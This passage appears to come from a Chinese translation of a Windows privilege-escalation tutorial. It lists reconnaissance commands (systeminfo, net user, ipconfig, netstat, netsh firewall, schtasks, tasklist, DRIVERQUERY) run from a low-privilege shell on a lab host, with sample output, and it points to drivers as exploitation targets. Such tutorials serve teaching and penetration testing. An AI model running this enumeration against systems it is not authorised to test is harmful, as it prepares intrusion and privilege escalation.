href="#首先查看连接的是什么操作系统：" class="headerlink" title="首先查看连接的是什么操作系统："></a>首先查看连接的是什么操作系统：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">//英文系统</div><div class="line">//C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</div><div class="line">//中文系统</div><div class="line">C:\Windows\system32&gt; systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</div><div class="line">OS 名称:                   Microsoft Windows 7 家庭普通版</div><div class="line">OS 版本:                6.1.7601 Service Pack 1 Build 7601</div></pre></td></tr></table></figure>
<h4 id="接下来查看主机名和当前shell-的用户名："><a href="#接下来查看主机名和当前shell-的用户名：" class="headerlink" title="接下来查看主机名和当前shell 的用户名："></a>接下来查看主机名和当前shell 的用户名：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; hostname</div><div class="line">b33f</div><div class="line"></div><div class="line">C:\Windows\system32&gt; echo %username%</div><div class="line">user1</div></pre></td></tr></table></figure>
<h4 id="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。"><a href="#现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1-不在localgroup-Administrators-中，不是管理员账号。" class="headerlink" title="现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。"></a>现在我们已经有了基本信息，让我们继续列出其他的用户账号名并查看我们自己更详细的信息。能够看到我们的账号user1 不在localgroup Administrators 中，不是管理员账号。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; net users</div><div class="line"></div><div class="line">User accounts for \\B33F</div><div class="line"></div><div class="line">-------------------------------------------------------------------------------</div><div class="line">Administrator            b33f                     Guest</div><div class="line">user1</div><div class="line">The command completed successfully.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net user user1</div><div class="line"></div><div class="line">User name                    user1</div><div class="line">Full Name</div><div class="line">Comment</div><div class="line">User&apos;s comment</div><div class="line">Country code                 000 (System Default)</div><div class="line">Account active               Yes</div><div class="line">Account expires              Never</div><div class="line"></div><div class="line">Password last set            1/11/2014 7:47:14 PM</div><div class="line">Password expires             Never</div><div class="line">Password changeable          1/11/2014 7:47:14 PM</div><div class="line">Password required            Yes</div><div class="line">User may change password     Yes</div><div class="line"></div><div class="line">Workstations allowed         All</div><div class="line">Logon script</div><div class="line">User profile</div><div class="line">Home directory</div><div class="line">Last logon                   1/11/2014 8:05:09 PM</div><div class="line"></div><div class="line">Logon hours allowed          All</div><div class="line"></div><div class="line">Local Group Memberships      *Users</div><div class="line">Global Group memberships     *None</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
<h4 id="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"><a href="#以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。" class="headerlink" title="以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。"></a>以上就是我们目前需要了解的用户和权限信息。接下来我们查看网络配置信息。</h4><h4 id="首先我们查看可用的网卡和路由表"><a href="#首先我们查看可用的网卡和路由表" class="headerlink" title="首先我们查看可用的网卡和路由表"></a>首先我们查看可用的网卡和路由表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; ipconfig /all</div><div class="line"></div><div class="line">Windows IP Configuration</div><div class="line"></div><div class="line">   Host Name . . . . . . . . . . . . : b33f</div><div class="line">   Primary Dns Suffix  . . . . . . . :</div><div class="line">   Node Type . . . . . . . . . . . . : Hybrid</div><div class="line">   IP Routing Enabled. . . . . . . . : No</div><div class="line">   WINS Proxy Enabled. . . . . . . . : No</div><div class="line"></div><div class="line">Ethernet adapter Bluetooth Network Connection:</div><div class="line"></div><div class="line">   Media State . . . . . . . . . . . : Media disconnected</div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network)</div><div class="line">   Physical Address. . . . . . . . . : 0C-84-DC-62-60-29</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   </div><div class="line">Ethernet adapter Local Area Connection:</div><div class="line"></div><div class="line">   Connection-specific DNS Suffix  . :</div><div class="line">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection</div><div class="line">   Physical Address. . . . . . . . . : 00-0C-29-56-79-35</div><div class="line">   DHCP Enabled. . . . . . . . . . . : Yes</div><div class="line">   Autoconfiguration Enabled . . . . : Yes</div><div class="line">   Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred)</div><div class="line">   IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred)</div><div class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</div><div class="line">   Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM</div><div class="line">   Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM</div><div class="line">   Default Gateway . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCP Server . . . . . . . . . . . : 192.168.0.1</div><div class="line">   DHCPv6 IAID . . . . . . . . . . . : 234884137</div><div class="line">   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35</div><div class="line">   DNS Servers . . . . . . . . . . . : 192.168.0.1</div><div class="line">   NetBIOS over Tcpip. . . . . . . . : Enabled</div><div class="line"></div><div class="line">C:\Windows\system32&gt; route print</div><div class="line"></div><div class="line">===========================================================================</div><div class="line">Interface List</div><div class="line"> 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network)</div><div class="line"> 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9</div><div class="line"> 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection</div><div class="line">  1...........................Software Loopback Interface 1</div><div class="line"> 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter</div><div class="line"> 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2</div><div class="line"> 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3</div><div class="line"> 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface</div><div class="line">===========================================================================</div><div class="line"></div><div class="line">IPv4 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line">Network Destination        Netmask          Gateway       Interface  Metric</div><div class="line">          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     10</div><div class="line">        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306</div><div class="line">        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">      192.168.0.0    255.255.255.0         On-link     192.168.0.104    266</div><div class="line">    192.168.0.104  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">    192.168.0.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306</div><div class="line">        224.0.0.0        240.0.0.0         On-link     192.168.0.104    266</div><div class="line">  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306</div><div class="line">  255.255.255.255  255.255.255.255         On-link     192.168.0.104    266</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line"></div><div class="line">IPv6 Route Table</div><div class="line">===========================================================================</div><div class="line">Active Routes:</div><div class="line"> If Metric Network Destination      Gateway</div><div class="line"> 14     58 ::/0                     On-link</div><div class="line">  1    306 ::1/128                  On-link</div><div class="line"> 14     58 2001::/32                On-link</div><div class="line"> 14    306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::/64                On-link</div><div class="line"> 14    306 fe80::/64                On-link</div><div class="line"> 14    306 fe80::8d2:b4e:3f57:ff97/128</div><div class="line">                                    On-link</div><div class="line"> 11    266 fe80::5cd4:9caf:61c0:ba6e/128</div><div class="line">                                    On-link</div><div class="line">  1    306 ff00::/8                 On-link</div><div class="line"> 14    306 ff00::/8                 On-link</div><div class="line"> 11    266 ff00::/8                 On-link</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line">  </div><div class="line"># arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; arp -A</div><div class="line"></div><div class="line">Interface: 192.168.0.104 --- 0xb</div><div class="line">  Internet Address      Physical Address      Type</div><div class="line">  192.168.0.1           90-94-e4-c5-b0-46     dynamic</div><div class="line">  192.168.0.101         ac-22-0b-af-bb-43     dynamic</div><div class="line">  192.168.0.255         ff-ff-ff-ff-ff-ff     static</div><div class="line">  224.0.0.22            01-00-5e-00-00-16     static</div><div class="line">  224.0.0.251           01-00-5e-00-00-fb     static</div><div class="line">  224.0.0.252           01-00-5e-00-00-fc     static</div><div class="line">  239.255.255.250       01-00-5e-7f-ff-fa     static</div><div class="line">  255.255.255.255       ff-ff-ff-ff-ff-ff     static</div></pre></td></tr></table></figure>
<h4 id="下面使用netstat-命令查看主机的网络连接和防火墙规则"><a href="#下面使用netstat-命令查看主机的网络连接和防火墙规则" class="headerlink" title="下面使用netstat 命令查看主机的网络连接和防火墙规则"></a>下面使用netstat 命令查看主机的网络连接和防火墙规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; netstat -ano</div><div class="line"></div><div class="line">Active Connections</div><div class="line"></div><div class="line">  Proto  Local Address          Foreign Address        State           PID</div><div class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684</div><div class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400</div><div class="line">  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    [::]:135               [::]:0                 LISTENING       684</div><div class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</div><div class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</div><div class="line">  UDP    0.0.0.0:5355           *:*                                    1100</div><div class="line">  UDP    0.0.0.0:52282          *:*                                    976</div><div class="line">  UDP    0.0.0.0:55202          *:*                                    2956</div><div class="line">  UDP    0.0.0.0:59797          *:*                                    1400</div><div class="line">  UDP    127.0.0.1:1900         *:*                                    2956</div><div class="line">  UDP    127.0.0.1:65435        *:*                                    2956</div><div class="line">  UDP    192.168.0.104:137      *:*                                    4</div><div class="line">  UDP    192.168.0.104:138      *:*                                    4</div><div class="line">  UDP    192.168.0.104:1900     *:*                                    2956</div><div class="line">  UDP    192.168.0.104:5353     *:*                                    1400</div><div class="line">  UDP    192.168.0.104:65434    *:*                                    2956</div><div class="line">  UDP    [::]:5355              *:*                                    1100</div><div class="line">  UDP    [::]:52281             *:*                                    976</div><div class="line">  UDP    [::]:52283             *:*                                    976</div><div class="line">  UDP    [::]:55203             *:*                                    2956</div><div class="line">  UDP    [::]:59798             *:*                                    1400</div><div class="line">  UDP    [::1]:1900             *:*                                    2956</div><div class="line">  UDP    [::1]:5353             *:*                                    1400</div><div class="line">  UDP    [::1]:65433            *:*                                    2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956</div><div class="line">  </div><div class="line"># The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh</div><div class="line">firewall commands are only available from XP SP2 and upwards.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show state</div><div class="line"></div><div class="line">Firewall status:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Profile                           = Standard</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line">Group policy version              = Windows Firewall</div><div class="line">Remote admin mode                 = Disable</div><div class="line"></div><div class="line">Ports currently open on all network interfaces:</div><div class="line">Port   Protocol  Version  Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">No ports are currently open on all network interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show config</div><div class="line"></div><div class="line">Domain profile configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Allowed programs configuration for Domain profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">Port configuration for Domain profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Domain profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Standard profile configuration (current):</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Service configuration for Standard profile:</div><div class="line">Mode     Customized  Name</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   No          Network Discovery</div><div class="line"></div><div class="line">Allowed programs configuration for Standard profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   Inbound              COMRaider / E:\comraider\comraider.exe</div><div class="line">Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe</div><div class="line"></div><div class="line">Port configuration for Standard profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Standard profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Log configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log</div><div class="line">Max file size   = 4096 KB</div><div class="line">Dropped packets = Disable</div><div class="line">Connections     = Disable</div></pre></td></tr></table></figure>
<h4 id="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"><a href="#最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动" class="headerlink" title="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"></a>最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line"># This will display verbose output for all scheduled tasks, below you can see sample output for a</div><div class="line">single task.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; schtasks /query /fo LIST /v</div><div class="line"></div><div class="line">Folder: \Microsoft\Windows Defender</div><div class="line">HostName:                             B33F</div><div class="line">TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</div><div class="line">Next Run Time:                        1/22/2014 5:11:13 AM</div><div class="line">Status:                               Ready</div><div class="line">Logon Mode:                           Interactive/Background</div><div class="line">Last Run Time:                        N/A</div><div class="line">Last Result:                          1</div><div class="line">Author:                               N/A</div><div class="line">Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</div><div class="line">                                      -WinTask -RestrictPrivilegesScan</div><div class="line">Start In:                             N/A</div><div class="line">Comment:                              Scheduled Scan</div><div class="line">Scheduled Task State:                 Enabled</div><div class="line">Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes</div><div class="line">Power Management:                     No Start On Batteries</div><div class="line">Run As User:                          SYSTEM</div><div class="line">Delete Task If Not Rescheduled:       Enabled</div><div class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</div><div class="line">Schedule:                             Scheduling data is not available in this format.</div><div class="line">Schedule Type:                        Daily</div><div class="line">Start Time:                           5:11:13 AM</div><div class="line">Start Date:                           1/1/2000</div><div class="line">End Date:                             1/1/2100</div><div class="line">Days:                                 Every 1 day(s)</div><div class="line">Months:                               N/A</div><div class="line">Repeat: Every:                        Disabled</div><div class="line">Repeat: Until: Time:                  Disabled</div><div class="line">Repeat: Until: Duration:              Disabled</div><div class="line">Repeat: Stop If Still Running:        Disabled</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line"># The following command links running processes to started services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; tasklist /SVC</div><div class="line"></div><div class="line">Image Name                     PID Services</div><div class="line">========================= ======== ============================================</div><div class="line">System Idle Process              0 N/A</div><div class="line">System                           4 N/A</div><div class="line">smss.exe                       244 N/A</div><div class="line">csrss.exe                      332 N/A</div><div class="line">csrss.exe                      372 N/A</div><div class="line">wininit.exe                    380 N/A</div><div class="line">winlogon.exe                   428 N/A</div><div class="line">services.exe                   476 N/A</div><div class="line">lsass.exe                      484 SamSs</div><div class="line">lsm.exe                        496 N/A</div><div class="line">svchost.exe                    588 DcomLaunch, PlugPlay, Power</div><div class="line">svchost.exe                    668 RpcEptMapper, RpcSs</div><div class="line">svchost.exe                    760 Audiosrv, Dhcp, eventlog,</div><div class="line">                                   HomeGroupProvider, lmhosts, wscsvc</div><div class="line">svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,</div><div class="line">                                   SysMain, TrkWks, UxSms, WdiSystemHost,</div><div class="line">                                   wudfsvc</div><div class="line">svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,</div><div class="line">                                   LanmanServer, MMCSS, ProfSvc, Schedule,</div><div class="line">                                   seclogon, SENS, ShellHWDetection, Themes,</div><div class="line">                                   Winmgmt, wuauserv</div><div class="line">audiodg.exe                    916 N/A</div><div class="line">svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,</div><div class="line">                                   WdiServiceHost, WinHttpAutoProxySvc</div><div class="line">svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,</div><div class="line">                                   NlaSvc</div><div class="line">spoolsv.exe                   1244 Spooler</div><div class="line">svchost.exe                   1272 BFE, DPS, MpsSvc</div><div class="line">mDNSResponder.exe             1400 Bonjour Service</div><div class="line">taskhost.exe                  1504 N/A</div><div class="line">taskeng.exe                   1556 N/A</div><div class="line">vmtoolsd.exe                  1580 VMTools</div><div class="line">dwm.exe                       1660 N/A</div><div class="line">explorer.exe                  1668 N/A</div><div class="line">vmware-usbarbitrator.exe      1768 VMUSBArbService</div><div class="line">TPAutoConnSvc.exe             1712 TPAutoConnSvc</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net start</div><div class="line"></div><div class="line">These Windows services are started:</div><div class="line"></div><div class="line">   Application Experience</div><div class="line">   Application Information</div><div class="line">   Background Intelligent Transfer Service</div><div class="line">   Base Filtering Engine</div><div class="line">   Bluetooth Support Service</div><div class="line">   Bonjour Service</div><div class="line">   COM+ Event System</div><div class="line">   COM+ System Application</div><div class="line">   Cryptographic Services</div><div class="line">   DCOM Server Process Launcher</div><div class="line">   Desktop Window Manager Session Manager</div><div class="line">   DHCP Client</div><div class="line">   Diagnostic Policy Service</div><div class="line">   Diagnostic Service Host</div><div class="line">   Diagnostic System Host</div><div class="line">   Distributed Link Tracking Client</div><div class="line">   Distributed Transaction Coordinator</div><div class="line">   DNS Client</div><div class="line">   Function Discovery Provider Host</div><div class="line">   Function Discovery Resource Publication</div><div class="line">   Group Policy Client</div><div class="line">[..Snip..]</div><div class="line">   </div><div class="line"># This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</div><div class="line">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; DRIVERQUERY</div><div class="line"></div><div class="line">Module Name  Display Name           Driver Type   Link Date</div><div class="line">============ ====================== ============= ======================</div><div class="line">1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM</div><div class="line">ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM</div><div class="line">AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM</div><div class="line">adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM</div><div class="line">adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM</div><div class="line">adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM</div><div class="line">AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM</div><div class="line">agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM</div><div class="line">aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM</div><div class="line">aliide       aliide                 Kernel        7/14/2009 7:11:17 AM</div><div class="line">amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM</div><div class="line">amdide       amdide                 Kernel        7/14/2009 7:11:19 AM</div><div class="line">AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM</div><div class="line">AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM</div><div class="line">amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM</div><div class="line">amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM</div><div class="line">amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM</div><div class="line">AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM</div><div class="line">arc          arc                    Kernel        5/25/2007 5:31:06 AM</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
